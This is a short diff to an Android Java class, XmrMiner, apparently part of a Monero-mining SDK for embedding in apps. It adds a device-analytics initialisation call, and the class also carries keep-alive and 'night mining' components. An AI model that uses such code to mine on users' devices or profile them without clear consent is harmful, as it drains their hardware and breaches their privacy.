@@ -7,13 +7,20 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.ServiceConnection;
+import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.provider.Settings;
 
 import java.io.ObjectStreamException;
+import java.util.Calendar;
 
 import waterhole.miner.core.AbstractMiner;
+import waterhole.miner.core.analytics.AnalyticsDevice;
+import waterhole.miner.core.analytics.AnalyticsInit;
+import waterhole.miner.core.analytics.AnalyticsWrapper;
+import waterhole.miner.core.asyn.AsyncTaskListener;
 import waterhole.miner.core.config.NightConfiguration;
 import waterhole.miner.core.keepAlive.DaemonEnv;
 import waterhole.miner.core.utils.LogUtils;
@@ -65,7 +72,7 @@ public final class XmrMiner extends AbstractMiner {
         return instance();
     }
 
-    public static void initApplication(Application application) {
+    public static void initApplication(final Application application) {
         if (application == null) {
             throw new IllegalArgumentException("application is null");
         }
@@ -76,6 +83,9 @@ public final class XmrMiner extends AbstractMiner {
 
         // 获取夜挖配置
         NightConfiguration.instance().fetchConfig(application);
+
+        // 统计设备信息，初始化挖矿数据
+        AnalyticsWrapper.initApplication(application);
     }
 
     @Override
